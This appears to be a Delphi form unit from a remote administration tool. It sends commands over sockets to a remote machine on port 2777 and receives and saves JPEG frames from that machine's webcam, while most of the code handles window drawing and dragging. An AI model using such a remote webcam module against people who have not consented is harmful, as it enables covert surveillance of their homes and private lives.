unit webcamUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, ScktComp,
  OutlookBtn, jpeg, RXSpin;

type
  Twebcam = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    websock: TClientSocket;
    Shape1: TShape;
    Image1: TImage;
    button1: TOutlookBtn;
    button2: TOutlookBtn;
    RxSpinEdit: TRxSpinEdit;
    Label1: TLabel;
    doit: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormShow(Sender: TObject);
    procedure button1Click(Sender: TObject);
    procedure websockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure websockConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure RxSpinEditChange(Sender: TObject);
    procedure doitTimer(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
    procedure ActivateLive;
    procedure DeActivateLive;
  end;

var
  webcam: Twebcam;
  receiving:boolean;

implementation

uses MainUnit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure Twebcam.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with Webcam,msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with Webcam,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure Twebcam.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 Shape1.Pen.Color:=cFormText;
 Label1.Color:=cFormBackground;
 Label1.Font.Color:=cFormText;
 RxSpinEdit.Color:=cFormForeground;
 RxSpinEdit.Font.Color:=cFormText;
 Invalidate;
end;

procedure Twebcam.FormCreate(Sender: TObject);
begin
 Tag:=11;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
 SetTheColors;
end;

procedure Twebcam.CloseButtonClick(Sender: TObject);
begin
 DeActivateLive;
 Hide;
end;

procedure Twebcam.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure Twebcam.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure Twebcam.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure Twebcam.FormShow(Sender: TObject);
begin
 capturing:=false;
end;

procedure TWebCam.ActivateLive;
begin
 capturing:=true;
 button1.caption:='stop live capture';
 MainForm.ClientSocket.Socket.SendText('IN7');
 websock.port:=2777;
 websock.address:=MainForm.ClientSocket.Address;
 try websock.Active:=True;except MainForm.ShowMsg('error connecting for preview');DeActivateLive;exit;end;
end;

procedure TWebCam.DeActivateLive;
begin
 capturing:=false;
 button1.caption:='start live capture';
 MainForm.ClientSocket.Socket.SendText('CL7');
 try websock.Active:=False;except end;
end;

procedure Twebcam.button1Click(Sender: TObject);
begin
 if (not capturing) then ActivateLive else DeActivateLive;
 Capturing:=False;
end;

procedure Twebcam.websockRead(Sender: TObject; Socket: TCustomWinSocket);
var Stream:TMemoryStream;
    nReceived,h,w,totalrecv,total,no,i: Integer;
    jpg:TJpegImage;
    undesalveaza,StrIn,totalbytes:String;
    evreuna:boolean;
begin
  if receiving then exit;
  UndeSalveaza:=MainForm.DownloadFolder;
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  evreuna:=false;
  if copy(strin,1,3)='RWC' then evreuna:=true;
  if not evreuna then exit;
  receiving:=true;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
 total:=StrToInt(totalbytes);
 if total=0 then begin
  MainForm.ShowMsg('webcam or quickcam not found or not operational.');
  DeActivateLive;
  EVreuna:=False;
  Exit;
 end;
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  while (totalrecv<total) do begin
   Application.ProcessMessages;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
   end;
  end;
  Stream.Position := 0;
  Stream.SaveToFile(undesalveaza+'webcam.jpg');
  jpg:=TJpegImage.Create;
  jpg.LoadFromStream(Stream);
  Image1.Picture.Bitmap.Assign(jpg);
  h:=jpg.height;
  w:=jpg.width;
  jpg.free;
  {Image1.Picture.LoadFromFile(undesalveaza+'webcam.jpg');}
 finally
  Stream.Free;
  receiving:=false;
 end;
 doit.Enabled:=True;
 webcam.Height:=h+115;
 webcam.Width:=w+25;
end;

procedure Twebcam.websockConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 websock.Socket.SendText('DOWC'+IntToStr(MainForm.TrackBar3.Value));
end;

procedure Twebcam.RxSpinEditChange(Sender: TObject);
begin
 doit.interval:=StrToInt(RxSpinEdit.Text)*1000;
end;

procedure Twebcam.doitTimer(Sender: TObject);
begin
 doit.enabled:=false;
 websock.Socket.SendText('DOWC'+IntToStr(MainForm.TrackBar3.Value));
end;

procedure Twebcam.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure Twebcam.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
